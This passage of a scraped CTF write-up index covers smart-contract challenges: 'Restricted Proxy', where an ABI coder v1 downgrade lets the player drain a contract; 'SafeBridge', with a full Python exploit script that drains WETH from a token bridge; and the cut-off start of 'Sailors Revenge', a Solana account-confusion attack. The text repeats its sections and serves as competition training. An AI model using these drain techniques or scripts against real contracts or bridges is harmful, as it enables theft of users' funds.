; constructor () payable { withdrawRate = 100 ; ownerWithdrawn = true ; } function becomeOwner ( uint256 ) external { assembly { sstore ( owner . slot , calldataload ( 4 )) } } function changeWithdrawRate ( uint8 ) external { assembly { sstore ( withdrawRate . slot , calldataload ( 4 )) } } function withdrawFunds () external { assembly { let ownerWithdrawnSlot := sload ( ownerWithdrawn . slot ) let ownerSlot := sload ( owner . slot ) let withdrawRateSlot := sload ( withdrawRate . slot ) if iszero ( ownerWithdrawnSlot ) { revert ( 0 , 0 ) } if iszero ( eq ( ownerSlot , caller ())) { revert ( 0 , 0 ) } sstore ( ownerWithdrawn . slot , 0 ) let contractBalance := selfbalance () let amount := div ( mul ( contractBalance , withdrawRateSlot ), WITHDRAW_DENOMINATOR ) let success := call ( gas (), caller (), amount , 0 , 0 , 0 , 0 ) if iszero ( success ) { revert ( 0 , 0 ) } } } } challenge.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 from typing import Dict from web3 import Web3 from base64 import b64decode import requests import secrets from eth_abi import abi from ctf_launchers.launcher import Action , pprint from ctf_launchers.pwn_launcher import PwnChallengeLauncher from ctf_launchers.utils import deploy from ctf_server.types import LaunchAnvilInstanceArgs , UserData , get_privileged_web3 , get_system_account from foundry.anvil import check_error from foundry.anvil import anvil_autoImpersonateAccount , anvil_setCode class Challenge ( PwnChallengeLauncher ): def after_init ( self ): self . _actions . append ( Action ( name = \"Upgrade the CTF contract\" , handler = self . upgrade_contract )) def get_anvil_instances ( self ) -> Dict [ str , LaunchAnvilInstanceArgs ]: return { \"main\" : self . get_anvil_instance ( fork_url = None , balance = 1 ) } def upgrade_contract ( self ): user_data = self . get_user_data () pprint ( 'Please input the new full source code in Base64.' ) pprint ( 'Terminal has a 1024 character limit on copy paste, so you can paste it in batches and finish with an empty one.' ) total_txt = '' next_txt = '1337' while next_txt != '' : next_txt = input ( 'Input: \\n ' ) total_txt += next_txt try : upgrade_contract = b64decode ( total_txt ) . decode () except Exception as e : return with open ( 'challenge/project/src/CTF.sol' , 'r' ) as f : original_contract = f . read () try : res = requests . post ( 'http://restricted-proxy-backend:3000/api/compare' , json = { 'originalContract' : original_contract , 'upgradeContract' : upgrade_contract }) . json () except Exception as e : return if 'error' in res or not res [ 'areEqual' ]: pprint ( 'Nope, sorry, that contract violates the upgrade rules.' ) return web3 = get_privileged_web3 ( user_data , \"main\" ) ( ctf_addr ,) = abi . decode ( [ \"address\" ], web3 . eth . call ( { \"to\" : user_data [ 'metadata' ][ \"challenge_address\" ], \"data\" : web3 . keccak ( text = \"ctf()\" )[: 4 ], } ), ) anvil_setCode ( web3 , ctf_addr , res [ 'bytecode' ]) pprint ( 'All okay! The CTF contract has been upgraded.' ) Challenge () . run () Solution \u00b6 The contract CTF has 100 ether. The function withdrawFunds can be called once by the owner, and the withdraw amount is related to the withdrawRate . The first parameter of the function becomeOwner is of type uint256 , and the function uses calldataload(4) to read the data, so we can just convert the address to a number and set the owner to ourselves. 1 2 3 4 5 function becomeOwner ( uint256 ) external { assembly { sstore ( owner . slot , calldataload ( 4 )) } } If we want to withdraw all ETH in the contract, we have to set the withdrawRate to 10000. Although the function changeWithdrawRate also uses calldataload(4) to read the data, its first parameter is of type uint8 . 1 2 3 4 5 function changeWithdrawRate ( uint8 ) external { assembly { sstore ( withdrawRate . slot , calldataload ( 4 )) } } Since Solidity v0.8.0, ABI coder v2 is activated by default. It performs more sanity checks on the inputs than v1. Due to the limitation of the parameter type, we can not set withdrawRate to 10000. 1 2 3 4 5 6 // Decompiled function 0xff853d0b ( uint256 varg0 ) public payable { require ( msg . data . length - 4 >= 32 ); require ( varg0 == uint8 ( varg0 )); _withdrawRate = varg0 ; } This challenge supports upgrading the code of the contract CTF , but it will determine whether it follows the rules based on the source code. We can not change the ABI, storage layout, etc. However, we can choose to use ABI coder v1 by adding pragma abicoder v1; . Therefore, the sanity check on the input is removed, then we can easily update the withdrawRate to 10000. 1 2 3 4 5 // Decompiled function 0xff853d0b ( uint256 varg0 ) public payable { require ( msg . data . length - 4 >= 32 ); _withdrawRate = varg0 ; } References \u00b6 Silent Changes of the Semantics ABI Coder Pragma","title":"Restricted Proxy"},{"location":"blockchain/restricted_proxy/#description","text":"Long, long ago (like... Block 42), a wizard has sealed 1 ETH inside a mystical Proxy Contract. You get one shot to proxy upgrade it\u2014but under these very strict rules: No Messing with the Family Tree The inheritance structure stays exactly as is. No new parents, no secret children. No Rewriting the Magic You can\u2019t alter existing functions or their visibility, and you can\u2019t add or remove any functions. No new spells, no banished spells. No Rearranging the Royal Closet. The storage layout cannot change. Touch a single uint256, and you might awaken the alignment demon. No Upgrading the Wizard\u2019s Quill Keep the same Solidity version. The wizard likes his dusty old version\u2014deal with it. Obey these ancient laws, upgrade the contract once, and claim the 1 ETH prize. But break them and face the dreaded 'Gasless Abyss!' nc 167.99.129.101 1337 Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity 0.8.26 ; import \"src/CTF.sol\" ; contract Challenge { address public immutable PLAYER ; address public immutable ctf ; constructor ( address player ) payable { PLAYER = player ; ctf = address ( new CTF { value : 100 ether }()); } function isSolved () external view returns ( bool ) { return PLAYER . balance >= 100 ether && ctf . balance == 0 ether ; } } CTF.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 // SPDX-License-Identifier: MIT pragma solidity 0.8.26 ; contract CTF { bool public ownerWithdrawn ; uint256 public withdrawRate ; address public owner ; uint256 public constant WITHDRAW_DENOMINATOR = 10000 ; constructor () payable { withdrawRate = 100 ; ownerWithdrawn = true ; } function becomeOwner ( uint256 ) external { assembly { sstore ( owner . slot , calldataload ( 4 )) } } function changeWithdrawRate ( uint8 ) external { assembly { sstore ( withdrawRate . slot , calldataload ( 4 )) } } function withdrawFunds () external { assembly { let ownerWithdrawnSlot := sload ( ownerWithdrawn . slot ) let ownerSlot := sload ( owner . slot ) let withdrawRateSlot := sload ( withdrawRate . slot ) if iszero ( ownerWithdrawnSlot ) { revert ( 0 , 0 ) } if iszero ( eq ( ownerSlot , caller ())) { revert ( 0 , 0 ) } sstore ( ownerWithdrawn . slot , 0 ) let contractBalance := selfbalance () let amount := div ( mul ( contractBalance , withdrawRateSlot ), WITHDRAW_DENOMINATOR ) let success := call ( gas (), caller (), amount , 0 , 0 , 0 , 0 ) if iszero ( success ) { revert ( 0 , 0 ) } } } } challenge.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 from typing import Dict from web3 import Web3 from base64 import b64decode import requests import secrets from eth_abi import abi from ctf_launchers.launcher import Action , pprint from ctf_launchers.pwn_launcher import PwnChallengeLauncher from ctf_launchers.utils import deploy from ctf_server.types import LaunchAnvilInstanceArgs , UserData , get_privileged_web3 , get_system_account from foundry.anvil import check_error from foundry.anvil import anvil_autoImpersonateAccount , anvil_setCode class Challenge ( PwnChallengeLauncher ): def after_init ( self ): self . _actions . append ( Action ( name = \"Upgrade the CTF contract\" , handler = self . upgrade_contract )) def get_anvil_instances ( self ) -> Dict [ str , LaunchAnvilInstanceArgs ]: return { \"main\" : self . get_anvil_instance ( fork_url = None , balance = 1 ) } def upgrade_contract ( self ): user_data = self . get_user_data () pprint ( 'Please input the new full source code in Base64.' ) pprint ( 'Terminal has a 1024 character limit on copy paste, so you can paste it in batches and finish with an empty one.' ) total_txt = '' next_txt = '1337' while next_txt != '' : next_txt = input ( 'Input: \\n ' ) total_txt += next_txt try : upgrade_contract = b64decode ( total_txt ) . decode () except Exception as e : return with open ( 'challenge/project/src/CTF.sol' , 'r' ) as f : original_contract = f . read () try : res = requests . post ( 'http://restricted-proxy-backend:3000/api/compare' , json = { 'originalContract' : original_contract , 'upgradeContract' : upgrade_contract }) . json () except Exception as e : return if 'error' in res or not res [ 'areEqual' ]: pprint ( 'Nope, sorry, that contract violates the upgrade rules.' ) return web3 = get_privileged_web3 ( user_data , \"main\" ) ( ctf_addr ,) = abi . decode ( [ \"address\" ], web3 . eth . call ( { \"to\" : user_data [ 'metadata' ][ \"challenge_address\" ], \"data\" : web3 . keccak ( text = \"ctf()\" )[: 4 ], } ), ) anvil_setCode ( web3 , ctf_addr , res [ 'bytecode' ]) pprint ( 'All okay! The CTF contract has been upgraded.' ) Challenge () . run ()","title":"Description"},{"location":"blockchain/restricted_proxy/#solution","text":"The contract CTF has 100 ether. The function withdrawFunds can be called once by the owner, and the withdraw amount is related to the withdrawRate . The first parameter of the function becomeOwner is of type uint256 , and the function uses calldataload(4) to read the data, so we can just convert the address to a number and set the owner to ourselves. 1 2 3 4 5 function becomeOwner ( uint256 ) external { assembly { sstore ( owner . slot , calldataload ( 4 )) } } If we want to withdraw all ETH in the contract, we have to set the withdrawRate to 10000. Although the function changeWithdrawRate also uses calldataload(4) to read the data, its first parameter is of type uint8 . 1 2 3 4 5 function changeWithdrawRate ( uint8 ) external { assembly { sstore ( withdrawRate . slot , calldataload ( 4 )) } } Since Solidity v0.8.0, ABI coder v2 is activated by default. It performs more sanity checks on the inputs than v1. Due to the limitation of the parameter type, we can not set withdrawRate to 10000. 1 2 3 4 5 6 // Decompiled function 0xff853d0b ( uint256 varg0 ) public payable { require ( msg . data . length - 4 >= 32 ); require ( varg0 == uint8 ( varg0 )); _withdrawRate = varg0 ; } This challenge supports upgrading the code of the contract CTF , but it will determine whether it follows the rules based on the source code. We can not change the ABI, storage layout, etc. However, we can choose to use ABI coder v1 by adding pragma abicoder v1; . Therefore, the sanity check on the input is removed, then we can easily update the withdrawRate to 10000. 1 2 3 4 5 // Decompiled function 0xff853d0b ( uint256 varg0 ) public payable { require ( msg . data . length - 4 >= 32 ); _withdrawRate = varg0 ; }","title":"Solution"},{"location":"blockchain/restricted_proxy/#references","text":"Silent Changes of the Semantics ABI Coder Pragma","title":"References"},{"location":"blockchain/safebridge/","tags":["smart contract","cross chain","data validation"],"text":"#smart contract #cross chain #data validation .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 I've crafted what I believed to be an ultra-safe token bridge. Don't believe it? nc 47.251.56.125 1337 safebridge.zip Solution \u00b6 This challenge is derived from Enterprise Blockchain in Paradigm CTF 2023. The CrossDomainMessenger.sendMessage() function, which can be used for sending cross-chain messages, is still public available. The difference is that when finalizing a cross-chain token transfer, it will verify whether the initiator of the cross-chain message is the bridge on the corresponding chain. Thus, cross-chain token transfers are only possible via L1ERC20Bridge.depositERC20() / L1ERC20Bridge.depositERC20To() and L2ERC20Bridge.withdraw() / L2ERC20Bridge.withdrawTo() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function finalizeERC20Withdrawal ( address _l1Token , address _l2Token , address _from , address _to , uint256 _amount ) public onlyFromCrossDomainAccount ( l2TokenBridge ) { deposits [ _l1Token ][ _l2Token ] = deposits [ _l1Token ][ _l2Token ] - _amount ; IERC20 ( _l1Token ). safeTransfer ( _to , _amount ); emit ERC20WithdrawalFinalized ( _l1Token , _l2Token , _from , _to , _amount ); } modifier onlyFromCrossDomainAccount ( address _sourceDomainAccount ) { require ( msg . sender == address ( getCrossDomainMessenger ()), \"messenger contract unauthenticated\" ); require ( getCrossDomainMessenger (). xDomainMessageSender () == _sourceDomainAccount , \"wrong sender of cross-domain message\" ); _ ; } To withdraw WETH from L1Bridge, we need to invoke the L2ERC20Bridge.withdraw() function. In _initiateWithdrawal() , l1Token is read from _l2Token . Since the _l2Token provided by users could be a custom token, then only the value of L1ERC20Bridge.deposits[weth][_l2Token] should not be less than the amount to be transferred 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function withdraw ( address _l2Token , uint256 _amount ) external virtual { _initiateWithdrawal ( _l2Token , msg . sender , msg . sender , _amount ); } function _initiateWithdrawal ( address _l2Token , address _from , address _to , uint256 _amount ) internal { IL2StandardERC20 ( _l2Token ). burn ( msg . sender , _amount ); address l1Token = IL2StandardERC20 ( _l2Token ). l1Token (); bytes memory message ; if ( _l2Token == Lib_PredeployAddresses . L2_WETH ) { message = abi . encodeWithSelector ( IL1ERC20Bridge . finalizeWethWithdrawal . selector , _from , _to , _amount ); } else { message = abi . encodeWithSelector ( IL1ERC20Bridge . finalizeERC20Withdrawal . selector , l1Token , _l2Token , _from , _to , _amount ); } sendCrossDomainMessage ( l1TokenBridge , message ); emit WithdrawalInitiated ( l1Token , _l2Token , msg . sender , _to , _amount ); } When initiating a transfer from L1 to L2, if _l1Token is weth , the corresponding amount of L2_WETH will be minted in L2ERC20Bridge.finalizeDeposit() . However, _l2Token may not be L2_WETH . If _l2Token is a custom token controlled by the player, not only can player obtain L2_WETH , but deposits[weth][_l2Token] will also increase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function depositERC20 ( address _l1Token , address _l2Token , uint256 _amount ) external virtual { _initiateERC20Deposit ( _l1Token , _l2Token , msg . sender , msg . sender , _amount ); } function _initiateERC20Deposit ( address _l1Token , address _l2Token , address _from , address _to , uint256 _amount ) internal { IERC20 ( _l1Token ). safeTransferFrom ( _from , address ( this ), _amount ); bytes memory message ; if ( _l1Token == weth ) { // @audit-issue no check if _l2Token is L2_WETH message = abi . encodeWithSelector ( IL2ERC20Bridge . finalizeDeposit . selector , address ( 0 ), Lib_PredeployAddresses . L2_WETH , _from , _to , _amount ); } else { message = abi . encodeWithSelector ( IL2ERC20Bridge . finalizeDeposit . selector , _l1Token , _l2Token , _from , _to , _amount ); } sendCrossDomainMessage ( l2TokenBridge , message ); deposits [ _l1Token ][ _l2Token ] = deposits [ _l1Token ][ _l2Token ] + _amount ; emit ERC20DepositInitiated ( _l1Token , _l2Token , _from , _to , _amount ); } Since deposits[weth][L2_WETH] already has a value, we can drain WETH in l1Bridge with L2_WETH and custom _l2Token Exploitation \u00b6 1 2 3 4 5 6 7 contract FakeL2StandardERC20 is L2StandardERC20 { constructor ( address _l1Token ) L2StandardERC20 ( _l1Token , \"FAKE\" , \"FAKE\" ) {} function mint ( address _to , uint256 _amount ) public override { _mint ( _to , _amount ); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import pwn from cheb3 import Connection from cheb3.utils import load_compiled fake_abi , fake_bin = load_compiled ( 'L2StandardERC20.sol' , 'FakeL2StandardERC20' ) challenge_abi , _ = load_compiled ( 'Challenge.sol' ) weth_abi , _ = load_compiled ( 'WETH.sol' ) l1bridge_abi , _ = load_compiled ( 'L1ERC20Bridge.sol' ) l2bridge_abi , _ = load_compiled ( 'L2ERC20Bridge.sol' ) L2_ERC20_BRIDGE = \"0x420000000000000000000000000000000000baBe\" L2_WETH = \"0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000\" AMOUNT = int ( 2e18 ) HOST = \"47.251.56.125\" PORT = 1337 TOKEN = \"<team-token>\" svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"token?\" , TOKEN ) svr . sendlineafter ( b \"action?\" , b \"1\" ) svr . recvuntil ( b \"rpc endpoints:\" ) l1 = Connection ( svr . recvline_contains ( b \"l1\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) l2 = Connection ( svr . recvline_contains ( b \"l2\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) priv = svr . recvline_contains ( b \"private\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () challenge_addr = svr . recvline_contains ( b \"challenge\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () svr . close () l1account = l1 . account ( priv ) l2account = l2 . account ( priv ) challenge = l1 . contract ( l1account , address = challenge_addr , abi = challenge_abi ) weth_addr = challenge . caller . WETH () l1bridge_addr = challenge . caller . BRIDGE () # deploy the custom token fake = l2 . contract ( l2account , abi = fake_abi , bytecode = fake_bin ) fake . deploy ( weth_addr ) # obtain L2_WETH and increase deposits[weth][fake] weth = l1 . contract ( l1account , address = weth_addr , abi = weth_abi ) weth . functions . deposit () . send_transaction ( value = AMOUNT ) weth . functions . approve ( l1bridge_addr , AMOUNT ) . send_transaction () l1bridge = l1 . contract ( l1account , address = l1bridge_addr , abi = l1bridge_abi ) l1bridge . functions . depositERC20 ( weth_addr , fake . address , AMOUNT ) . send_transaction () # withdraw fake . functions . mint ( l2account . address , AMOUNT ) . send_transaction () fake . functions . approve ( L2_ERC20_BRIDGE , AMOUNT ) . send_transaction () l2bridge = l2 . contract ( l2account , address = L2_ERC20_BRIDGE , abi = l2bridge_abi ) l2bridge . functions . withdraw ( fake . address , AMOUNT ) . send_transaction () l2weth = l2 . contract ( l2account , address = L2_WETH , abi = weth_abi ) l2weth . functions . approve ( L2_ERC20_BRIDGE , AMOUNT ) . send_transaction () l2bridge . functions . withdraw ( L2_WETH , AMOUNT ) . send_transaction () assert challenge . caller . isSolved () svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"token?\" , TOKEN ) svr . sendlineafter ( b \"action?\" , b \"3\" ) svr . interactive () Flag \u00b6 rwctf{yoU_draINED_BriD6E}","title":"SafeBridge"},{"location":"blockchain/safebridge/#description","text":"I've crafted what I believed to be an ultra-safe token bridge. Don't believe it? nc 47.251.56.125 1337 safebridge.zip","title":"Description"},{"location":"blockchain/safebridge/#solution","text":"This challenge is derived from Enterprise Blockchain in Paradigm CTF 2023. The CrossDomainMessenger.sendMessage() function, which can be used for sending cross-chain messages, is still public available. The difference is that when finalizing a cross-chain token transfer, it will verify whether the initiator of the cross-chain message is the bridge on the corresponding chain. Thus, cross-chain token transfers are only possible via L1ERC20Bridge.depositERC20() / L1ERC20Bridge.depositERC20To() and L2ERC20Bridge.withdraw() / L2ERC20Bridge.withdrawTo() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function finalizeERC20Withdrawal ( address _l1Token , address _l2Token , address _from , address _to , uint256 _amount ) public onlyFromCrossDomainAccount ( l2TokenBridge ) { deposits [ _l1Token ][ _l2Token ] = deposits [ _l1Token ][ _l2Token ] - _amount ; IERC20 ( _l1Token ). safeTransfer ( _to , _amount ); emit ERC20WithdrawalFinalized ( _l1Token , _l2Token , _from , _to , _amount ); } modifier onlyFromCrossDomainAccount ( address _sourceDomainAccount ) { require ( msg . sender == address ( getCrossDomainMessenger ()), \"messenger contract unauthenticated\" ); require ( getCrossDomainMessenger (). xDomainMessageSender () == _sourceDomainAccount , \"wrong sender of cross-domain message\" ); _ ; } To withdraw WETH from L1Bridge, we need to invoke the L2ERC20Bridge.withdraw() function. In _initiateWithdrawal() , l1Token is read from _l2Token . Since the _l2Token provided by users could be a custom token, then only the value of L1ERC20Bridge.deposits[weth][_l2Token] should not be less than the amount to be transferred 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function withdraw ( address _l2Token , uint256 _amount ) external virtual { _initiateWithdrawal ( _l2Token , msg . sender , msg . sender , _amount ); } function _initiateWithdrawal ( address _l2Token , address _from , address _to , uint256 _amount ) internal { IL2StandardERC20 ( _l2Token ). burn ( msg . sender , _amount ); address l1Token = IL2StandardERC20 ( _l2Token ). l1Token (); bytes memory message ; if ( _l2Token == Lib_PredeployAddresses . L2_WETH ) { message = abi . encodeWithSelector ( IL1ERC20Bridge . finalizeWethWithdrawal . selector , _from , _to , _amount ); } else { message = abi . encodeWithSelector ( IL1ERC20Bridge . finalizeERC20Withdrawal . selector , l1Token , _l2Token , _from , _to , _amount ); } sendCrossDomainMessage ( l1TokenBridge , message ); emit WithdrawalInitiated ( l1Token , _l2Token , msg . sender , _to , _amount ); } When initiating a transfer from L1 to L2, if _l1Token is weth , the corresponding amount of L2_WETH will be minted in L2ERC20Bridge.finalizeDeposit() . However, _l2Token may not be L2_WETH . If _l2Token is a custom token controlled by the player, not only can player obtain L2_WETH , but deposits[weth][_l2Token] will also increase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function depositERC20 ( address _l1Token , address _l2Token , uint256 _amount ) external virtual { _initiateERC20Deposit ( _l1Token , _l2Token , msg . sender , msg . sender , _amount ); } function _initiateERC20Deposit ( address _l1Token , address _l2Token , address _from , address _to , uint256 _amount ) internal { IERC20 ( _l1Token ). safeTransferFrom ( _from , address ( this ), _amount ); bytes memory message ; if ( _l1Token == weth ) { // @audit-issue no check if _l2Token is L2_WETH message = abi . encodeWithSelector ( IL2ERC20Bridge . finalizeDeposit . selector , address ( 0 ), Lib_PredeployAddresses . L2_WETH , _from , _to , _amount ); } else { message = abi . encodeWithSelector ( IL2ERC20Bridge . finalizeDeposit . selector , _l1Token , _l2Token , _from , _to , _amount ); } sendCrossDomainMessage ( l2TokenBridge , message ); deposits [ _l1Token ][ _l2Token ] = deposits [ _l1Token ][ _l2Token ] + _amount ; emit ERC20DepositInitiated ( _l1Token , _l2Token , _from , _to , _amount ); } Since deposits[weth][L2_WETH] already has a value, we can drain WETH in l1Bridge with L2_WETH and custom _l2Token","title":"Solution"},{"location":"blockchain/safebridge/#exploitation","text":"1 2 3 4 5 6 7 contract FakeL2StandardERC20 is L2StandardERC20 { constructor ( address _l1Token ) L2StandardERC20 ( _l1Token , \"FAKE\" , \"FAKE\" ) {} function mint ( address _to , uint256 _amount ) public override { _mint ( _to , _amount ); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import pwn from cheb3 import Connection from cheb3.utils import load_compiled fake_abi , fake_bin = load_compiled ( 'L2StandardERC20.sol' , 'FakeL2StandardERC20' ) challenge_abi , _ = load_compiled ( 'Challenge.sol' ) weth_abi , _ = load_compiled ( 'WETH.sol' ) l1bridge_abi , _ = load_compiled ( 'L1ERC20Bridge.sol' ) l2bridge_abi , _ = load_compiled ( 'L2ERC20Bridge.sol' ) L2_ERC20_BRIDGE = \"0x420000000000000000000000000000000000baBe\" L2_WETH = \"0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000\" AMOUNT = int ( 2e18 ) HOST = \"47.251.56.125\" PORT = 1337 TOKEN = \"<team-token>\" svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"token?\" , TOKEN ) svr . sendlineafter ( b \"action?\" , b \"1\" ) svr . recvuntil ( b \"rpc endpoints:\" ) l1 = Connection ( svr . recvline_contains ( b \"l1\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) l2 = Connection ( svr . recvline_contains ( b \"l2\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) priv = svr . recvline_contains ( b \"private\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () challenge_addr = svr . recvline_contains ( b \"challenge\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () svr . close () l1account = l1 . account ( priv ) l2account = l2 . account ( priv ) challenge = l1 . contract ( l1account , address = challenge_addr , abi = challenge_abi ) weth_addr = challenge . caller . WETH () l1bridge_addr = challenge . caller . BRIDGE () # deploy the custom token fake = l2 . contract ( l2account , abi = fake_abi , bytecode = fake_bin ) fake . deploy ( weth_addr ) # obtain L2_WETH and increase deposits[weth][fake] weth = l1 . contract ( l1account , address = weth_addr , abi = weth_abi ) weth . functions . deposit () . send_transaction ( value = AMOUNT ) weth . functions . approve ( l1bridge_addr , AMOUNT ) . send_transaction () l1bridge = l1 . contract ( l1account , address = l1bridge_addr , abi = l1bridge_abi ) l1bridge . functions . depositERC20 ( weth_addr , fake . address , AMOUNT ) . send_transaction () # withdraw fake . functions . mint ( l2account . address , AMOUNT ) . send_transaction () fake . functions . approve ( L2_ERC20_BRIDGE , AMOUNT ) . send_transaction () l2bridge = l2 . contract ( l2account , address = L2_ERC20_BRIDGE , abi = l2bridge_abi ) l2bridge . functions . withdraw ( fake . address , AMOUNT ) . send_transaction () l2weth = l2 . contract ( l2account , address = L2_WETH , abi = weth_abi ) l2weth . functions . approve ( L2_ERC20_BRIDGE , AMOUNT ) . send_transaction () l2bridge . functions . withdraw ( L2_WETH , AMOUNT ) . send_transaction () assert challenge . caller . isSolved () svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"token?\" , TOKEN ) svr . sendlineafter ( b \"action?\" , b \"3\" ) svr . interactive ()","title":"Exploitation"},{"location":"blockchain/safebridge/#flag","text":"rwctf{yoU_draINED_BriD6E}","title":"Flag"},{"location":"blockchain/sailors_revenge/","tags":["solana","account confusions"],"text":"#solana #account confusions .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 After the sailors were betrayed by their trusty anchor, they rewrote their union smart contract to be anchor-free! They even added a new registration feature so you can show off your union registration on the blockchain! nc challs.actf.co 31404 sailors_revenge.tar.gz \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u83b7\u53d6\u81f3\u5c11 \\(10^8\\) lamports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const TARGET_AMT : u64 = 100_000_000 ; // check solve let balance = challenge . env . get_account ( user . pubkey ()) . ok_or ( \"could not find user\" ) ? . lamports ; writeln! ( socket , \"lamports: {:?}\" , balance ) ? ; if balance > TARGET_AMT { let flag = fs :: read_to_string ( \"flag.txt\" ) ? ; writeln! ( socket , \"You successfully exploited the working class and stole their union dues! Congratulations! \\n Flag: {}\" , flag . trim () ) ? ; } else { writeln! ( socket , \"That's not enough to get the flag!\" ) ? ; } \u7a0b\u5e8f\u652f\u6301\u56db\u79cd\u6307\u4ee4 CreateUnion \u5411 vault \u53d1\u9001 bal lamports\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u8d26\u6237\u5b58\u50a8 SailorUnion \u7ed3\u6784\u7684\u6570\u636e\uff0c\u521d\u59cb available_funds \u4e3a 0 PayDues \u5f53 member \u7684\u4f59\u989d\u4e0d\u4f4e\u4e8e amt \u65f6\uff0c\u5c06 amt lamports \u4ece member \u8f6c\u79fb\u5230 vault \uff0c SailorUnion \u7684 available_funds \u589e\u52a0 amt StrikePay \u5f53 available_funds \u4e0d\u4f4e\u4e8e amt \u65f6\uff0c\u5c06 amt lamports \u4ece vault \u8f6c\u79fb\u5230 member \uff08\u589e\u52a0 user \u8d26\u6237\u4f59\u989d\u7684\u552f\u4e00\u65b9\u6cd5 :D\uff09 RegisterMember \u521b\u5efa\u4e00\u4e2a\u8d26\u6237\u5b58\u50a8 Registration \u7ed3\u6784\u7684\u6570\u636e\uff0c\u521d\u59cb balance \u4e3a -100 1 2 3 4 5 6 7 let ins = SailorInstruction :: try_from_slice ( instruction_data ) ? ; match ins { SailorInstruction :: CreateUnion ( bal ) => processor :: create_union ( program_id , accounts , bal ), SailorInstruction :: PayDues ( amt ) => processor :: pay_dues ( program_id , accounts , amt ), SailorInstruction :: StrikePay ( amt ) => processor :: strike_pay ( program_id , accounts , amt ), SailorInstruction :: RegisterMember ( member ) => processor :: register_member ( program_id , accounts , member ) } SailorUnion \u548c Registration \u7684\u5b57\u6bb5\u662f\u91cd\u5408\u7684\uff0c\u4e14 balance \u7684\u7c7b\u578b\u4e3a i64 \uff0c\u82e5\u6309\u7167 SailorUnion \u53cd\u5e8f\u5217\u5316 balance \u4e3a\u8d1f\u6570\u7684 Registration \u7c7b\u578b\u7684\u6570\u636e\uff0c\u5c06\u5f97\u5230\u4e00\u4e2a\u6570\u503c\u5f88\u5927\u7684 u64 \uff0c\u540c\u65f6 member \u5bf9\u5e94 authority 1 2 3 4 5 6 7 8 9 10 11 #[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)] pub struct SailorUnion { available_funds : u64 , authority : [ u8 ; 32 ], } #[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)] pub struct Registration { balance : i64 , member : [ u8 ; 32 ], } \u90a3\u4e48\uff0c\u5728\u8c03\u7528 strike_pay \u65f6\u5c06 rich_boi \u4e3a user \u6ce8\u518c\u7684 Registration \u8d26\u6237\u4f5c\u4e3a SailorUnion \u8d26\u6237\u4f20\u5165\u5c31\u53ef\u4ee5\u5566 (\u03a6\u02cb\u03c9\u02ca\u03a6) Exploitation \u00b6 1 2 3 4 5 $ cargo new solve $ cd solve/ $ mv src/main.rs src/lib.rs $ cargo add solana_program borsh $ cargo-build-bpf Cargo.toml 1 2 3 4 5 6 7 8 9 10 11 [package] name = \"solve\" version = \"0.1.0\" edition = \"2021\" [dependencies] borsh = \"0.10.3\" solana-program = \"1.14.11\" [lib] crate-type = [ \"cdylib\" , \"rlib\" ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 